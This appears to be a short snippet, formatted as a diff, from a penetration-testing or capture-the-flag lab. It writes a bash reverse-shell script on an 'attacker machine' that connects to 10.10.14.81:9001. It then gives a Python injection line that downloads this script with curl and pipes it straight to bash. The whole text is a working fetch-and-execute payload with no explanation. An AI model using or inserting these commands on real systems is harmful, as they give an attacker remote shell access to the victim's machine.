@@ -1,0 +1,5 @@
+# On our Attacker Machine
+echo '#!/bin/bash' > shell.sh
+echo 'bash -i >& /dev/tcp/10.10.14.81/9001 0>&1' >> shell.sh
+
+import os; os.system("curl 10.10.14.81:8000/shell.sh|bash")
